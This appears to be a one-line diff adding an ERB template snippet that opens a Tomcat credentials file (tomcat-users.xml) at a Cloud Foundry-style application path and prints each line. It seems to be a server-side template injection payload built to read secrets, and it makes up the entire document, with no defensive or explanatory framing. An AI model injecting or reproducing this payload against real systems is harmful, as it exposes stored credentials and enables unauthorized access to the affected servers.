@@ -1,0 +1,1 @@
+<% path='/home/vcap/app/WEB-INF/conf/tomcat-users.xml' %> <% IO.foreach(path) do |s| puts s end %>
